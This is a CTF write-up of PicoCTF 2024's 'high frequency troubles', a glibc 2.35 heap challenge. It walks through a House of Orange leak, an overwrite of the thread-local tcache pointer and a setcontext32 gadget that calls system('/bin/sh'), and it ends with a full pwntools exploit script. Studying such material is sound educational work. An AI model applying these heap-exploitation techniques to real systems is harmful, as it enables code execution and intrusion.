---
title: "PicoCTF 2024 - high frequency troubles"
excerpt: "mmaped memory manufactures meticulous menaces"
date: 2024-03-28T19:21:13Z
tags: []
---

A few weeks ago, I played PicoCTF 2024 with a few friends. We were the first team to solve all the challenges, getting us first place on the high school scoreboard and first place overall. `high frequency troubles` by [pepsipu](https://pepsipu.com/) was the least-solved challenge in the competition, with 31 solves at the end of the competition. I worked on this challenge with my teammate stuckin414141, and we were able to solve it with a pretty cool (although slightly unintended) solution.

We are given a [binary](https://artifacts.picoctf.net/c_tethys/8/hft), the [source code](https://artifacts.picoctf.net/c_tethys/8/main.c), and the [libc](https://artifacts.picoctf.net/c_tethys/8/libc.so.6) that goes with this program.

## The challenge
Looking at the source code, we find a pretty simple program:
```C
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

enum
{
    PKT_OPT_PING,
    PKT_OPT_ECHO,
    PKT_OPT_TRADE,
} typedef pkt_opt_t;

enum
{
    PKT_MSG_INFO,
    PKT_MSG_DATA,
} typedef pkt_msg_t;

struct
{
    size_t sz;
    uint64_t data[];
} typedef pkt_t;

const struct
{
    char *header;
    char *color;
} type_tbl[] = {
    [PKT_MSG_INFO] = {"PKT_INFO", "\x1b[1;34m"},
    [PKT_MSG_DATA] = {"PKT_DATA", "\x1b[1;33m"},
};

void putl(pkt_msg_t type, char *msg)
{
    printf("%s%s\x1b[m:[%s]\n", type_tbl[type].color, type_tbl[type].header, msg);
}

// gcc main.c -o hft -g
int main()
{
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    putl(PKT_MSG_INFO, "BOOT_SQ");

    for (;;)
    {
        putl(PKT_MSG_INFO, "PKT_RES");

        size_t sz = 0;
        fread(&sz, sizeof(size_t), 1, stdin);

        pkt_t *pkt = malloc(sz);
        pkt->sz = sz;
        gets(&pkt->data);

        switch (pkt->data[0])
        {
        case PKT_OPT_PING:
            putl(PKT_MSG_DATA, "PONG_OK");
            break;
        case PKT_OPT_ECHO:
            putl(PKT_MSG_DATA, (char *)&pkt->data[1]);
            break;
        default:
            putl(PKT_MSG_INFO, "E_INVAL");
            break;
        }
    }

    putl(PKT_MSG_INFO, "BOOT_EQ");
}
```

There isn't *too* much functionality going on, but it isn't minimal either (like some [other challenges](https://blog.pepsipu.com/posts/nightmare) by the same author). 

Putting aside the weird messages and constant names, this looks like a pretty standard heap menu challenge—we can allocate a chunk using `malloc()` through using any option, and print data from a chunk using the `PKT_OPT_ECHO` option. We can control the size of allocations, and we send options in the following format:
```
| 00 00 00 00 | 00 00 00 00 00 00 00 00 | 00 00 00 00 ... 
|    size     |         option          |   any data  ...
```
One thing we notice is *not* present is any kind of call to `free()`. Usually, we get a lot of attack surface when we can free chunks, but in this program `free()` is never called at all.

However, to make up for this we have a pretty easy vulnerability; the call to `gets()` in `main` allows us to overflow as much data as we want onto the heap. This opens up all sorts of doors for us, as we'll see in a bit.

Looking at the binary and libc, we see that we are working with almost full protections, and are using GLIBC 2.35. For this challenge, this isn't too relevant.
```
# checksec hft
[*] '/mnt/c/users/matda/downloads/hft/hft'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
# ./libc.so.6
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.3) stable release version 2.35.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 11.3.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
```

We also make a helper function to help us to allocate easily:

```python
def send_echo(content, sz, end=True) :
    sock.recvuntil("PKT_RES")
    sock.send(p32(sz))
    if len(content) != 0:
      payload = p32(0) + p64(1) + content
    else:
      payload = p32(0) + b'\x01\0\0\0\0\0'
    sock.sendline(payload)
```

## Exploitation
### Step 1 - Infoleak
Our first goal is to get a leak. However, this isn't really possible at the moment, because our functions only allow us to interact with the heap, and there is practically no data at all on the heap. We can allocate new chunks on the heap, and we can overflow past their ends, but without using `free()`, there isn't a way to get any kind of pointer onto the heap for us to leak.

But this isn't a new predicament; there's actually a situation in which we can cause `__int_free` to be called! This is used in the first step of the classic House of Orange, and was shown in the challenge from SECCON Beginners CTF 2021, [freeless](https://web.archive.org/web/20210613164247/https://dystopia.sg/seccon-beginners-2021-freeless/). 

This trick works when we can overwrite the size of the top chunk. In the [GLIBC source code](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L2665), we see that the top chunk will be freed (and put in the unsorted bin) when an allocation is made that is too big for the top chunk to service, but smaller than `mp_.mmap_threshold`. This will cause the heap to be expanded using `sbrk`, and the remainder of the top chunk to be freed.

We get this to happen by overwriting the size of the top chunk to a smaller size (while keeping the last three nibbles the same to pass the page alignment check). This causes the top chunk to be freed after the next allocation!

We implement this using our helper function:
```python
send_echo(b"", 0x10)
send_echo(b"a"*8 + p64(0xd31), 0x10) # overflow the top chunk size
send_echo(b"b"*0xf00, 0x1000) # allocate a big chunk to cause the free
send_echo(b"", 0x8) # get the leak!
conn.recvuntil(b":[")
leak = u64(conn.recv(6) + b"\0\0")
info("heap leak: " + hex(leak))
```
This allocation triggers some heap mechanisms, adding a chunk to the unsorted bin. This happens to place a heap pointer in the third QWORD of our chunk, which is the part that we can leak!

So, we have a leak of the heap. Now what?

### Step 2 - mmap?
At this point we got pretty stuck; there wasn't much we could do with the heap at this point. Our frees would only lead to chunks that are in the unsorted bin, and the unsorted bin attack has been patched since GLIBC 2.31.

However, we can take a look at the hint in the description of the challenge:

> allocate a size greater than mp_.mmap_threshold

At first, the idea of mmap chunks doesn't seem very useful. The only attack I knew of was the [House of Muney](https://maxwelldulin.com/BlogPost/House-of-Muney-Heap-Exploitation), which requires a heap underflow (which we could theoretically get by allocating two adjacent mmap chunks and overflowing into the second one) and the ability to free a mmap chunk (which we definitely don't have).

Experimenting around though, we can find a different area of memory to attack. I initially found this by just overflowing my mmap chunk and seeing where the program segfaulted. It turns out, right above our mmap chunk and right below libc, is [thread-local storage](https://gcc.gnu.org/onlinedocs/gcc/Thread-Local.html)!

There are a lot of interesting things stored in thead-local storage; one of them is the canary value for stack smashing protection. But the thing that we're interested in here is the pointer to `tcache_perthread_struct`. 

As the name suggests, `tcache_perthread_struct` is local to each thread (meaning that its location is stored in thread-local storage), and it contains the freelists for the tcache (which, even in the latest versions of GLIBC, is relatively lax on security checks!). Because we can overwrite thread-local storage, we can change where tcache_perthread_struct is located in memory!

We can overwrite the pointer to a value that is later on the heap than it is already (usually, `tcache_perthread_struct` is at the very beginning of the heap). Then, we essentially control the freelist, allowing us to allocate chunks at arbitrary (sixteen byte aligned) addresses! Our first objective is to get a libc leak; we can allocate a chunk that is over the libc pointers put onto the stack by the unsorted bin chunk that we allocated earlier. We fill the other freelists with addresses that allow us to re-overwrite `tcache_perthread_struct` again later for future overwrites.

We do this in our script:

```python
payload = b"a"*(8*6) # counts in tcache_perthread_struct (not really relevant, just not 0)
payload += p64(leak-8*4+0x30+0xa0) # 0x20 bin (location of libc address)
payload += p64(leak+0x30) # 0x30 bin
payload += p64(leak+0x30) # 0x40 bin
payload += p64(leak+0x30) # 0x50 bin
payload += p64(leak+0x30) # 0x60 bin
payload += p64(leak+0x30) # 0x70 bin
send_echo(payload, 0x80) # new tcache perthread struct

send_echo(b"a\0a" + b"a"*(0x10000-3)+b"b"*(136920) + p64(leak-0x10), 0x30001) # overwrite tls pointer to tcache_perthread_struct

send_echo(b"", 0x10) # allocate over libc address
conn.recvuntil(b":[")
libcleak = u64(conn.recv(6) + b"\0\0")
libc.address = libcleak - 0x21a280 - 0x60
info("libc @ " + hex(libc.address))
```

With our libc leak obtained, we can now try to get a shell. This should be simple... but in GLIBC 2.35, `__free_hook` and `__malloc_hook` are gone. How do we utilize our arbitrary write to get a shell?

### Step 3 - just get a shell already
There are actually a lot of ways we could have done this. I tried overwriting libc GOT entries with one_gadgets, but none of them seemed to work. Overwriting atexit handlers or the stack would also work, but they would need extra leaks which I was too lazy to get.

Ultimately, I realized something that the challenge author told me about when we were chilling in DC together last month... the `setcontext32` gadget. This allows for calling a function with all registers controlled, just from controlling the beginning of the writable section of libc. Looking it up to refresh my memory, I found that he had even written a [blog post](https://hackmd.io/@pepsipu/SyqPbk94a) about it! 

Now, all there was left to do was use the function provided in the post, and adjust my helper function to allow me to control the beginning of the chunk:

```python
dest, pl = setcontext32(
        libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()
    )

def send_raw(content, sz, end=True) :
    sock.recvuntil("PKT_RES")
    sock.send(p64(sz))
    payload = content
    sock.sendline(payload)

payload = b"a"*(8*6)
payload += p64(dest)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
send_echo(payload, 0x50) # new tcache_perthread_struct

send_raw(pl[8:], 0) # we want first qword to be 0 because payload is cut off, this convenitently sets the right bytes by setting size to 0

conn.interactive()
```

With this, we get a shell, and we can get the flag: `picoCTF{mm4p_mm4573r_de3d190b}`

Thanks to [pepsipu](https://pepsipu.com/) for a really cool challenge!

Solve script:
```python
#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF("./hft_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

#sock = conn = process()
sock = conn = remote("tethys.picoctf.net", 57462)

def send_ping(content, sz):
    sock.recvuntil(b"PKT_RES")
    sock.send(p32(sz))
    sock.sendline(p32(0) + p64(0) + content)

def send_echo(content, sz, end=True) :
    sock.recvuntil(b"PKT_RES")
    sock.send(p32(sz))
    if len(content) != 0:
      payload = p32(0) + p64(1) + content
    else:
      payload = p32(0) + b'\x01\0\0\0\0\0'
    sock.sendline(payload)

send_echo(b"", 0x10)
send_echo(b"a"*8 + p64(0xd31), 0x10)
send_echo(b"b"*0xf00, 0x1000)
send_echo(b"", 0x8)
conn.recvuntil(b":[")
leak = u64(conn.recv(6) + b"\0\0")
info("heap leak: " + hex(leak))

payload = b"a"*(8*6) # counts in tcache_perthread_struct (not really relevant, just not 0)
payload += p64(leak-8*4+0x30+0xa0) # 0x20 bin (location of libc address)
payload += p64(leak+0x30) # 0x30 bin
payload += p64(leak+0x30) # 0x40 bin
payload += p64(leak+0x30) # 0x50 bin
payload += p64(leak+0x30) # 0x60 bin
payload += p64(leak+0x30) # 0x70 bin
send_echo(payload, 0x80) # new tcache perthread struct

send_echo(b"a\0a" + b"a"*(0x10000-3)+b"b"*(136920) + p64(leak-0x10), 0x30001) # overwrite tls pointer to tcache_perthread_struct

send_echo(b"", 0x10) # allocate over libc address
conn.recvuntil(b":[")
libcleak = u64(conn.recv(6) + b"\0\0")
libc.address = libcleak - 0x21a280 - 0x60
info("libc @ " + hex(libc.address))

def create_ucontext(
    src: int,
    rsp=0,
    rbx=0,
    rbp=0,
    r12=0,
    r13=0,
    r14=0,
    r15=0,
    rsi=0,
    rdi=0,
    rcx=0,
    r8=0,
    r9=0,
    rdx=0,
    rip=0xDEADBEEF,
) -> bytearray:
    b = bytearray(0x200)
    b[0xE0:0xE8] = p64(src)  # fldenv ptr
    b[0x1C0:0x1C8] = p64(0x1F80)  # ldmxcsr

    b[0xA0:0xA8] = p64(rsp)
    b[0x80:0x88] = p64(rbx)
    b[0x78:0x80] = p64(rbp)
    b[0x48:0x50] = p64(r12)
    b[0x50:0x58] = p64(r13)
    b[0x58:0x60] = p64(r14)
    b[0x60:0x68] = p64(r15)

    b[0xA8:0xB0] = p64(rip)  # ret ptr
    b[0x70:0x78] = p64(rsi)
    b[0x68:0x70] = p64(rdi)
    b[0x98:0xA0] = p64(rcx)
    b[0x28:0x30] = p64(r8)
    b[0x30:0x38] = p64(r9)
    b[0x88:0x90] = p64(rdx)

    return b

def setcontext32(libc: ELF, **kwargs) -> (int, bytes):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt_trampoline = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    return got, flat(
        p64(0),
        p64(got + 0x218),
        p64(libc.symbols["setcontext"] + 32),
        p64(plt_trampoline) * 0x40,
        create_ucontext(got + 0x218, rsp=libc.symbols["environ"] + 8, **kwargs),
    )

dest, pl = setcontext32(
             libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()
           )

def send_raw(content, sz, end=True) :
    sock.recvuntil(b"PKT_RES")
    sock.send(p64(sz))
    payload = content
    sock.sendline(payload)

payload = b"a"*(8*6)
payload += p64(dest)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
send_echo(payload, 0x50) # new tcache_perthread_struct

send_raw(pl[8:], 0)

conn.interactive()
```

afternote: this solution was a bit unintended, I found out later; the intended solution does not use the house of orange to get a leak. Instead, it uses partial overwrites to control tcache before getting a leak. This made the challenge a bit easier than it was supposed to be.
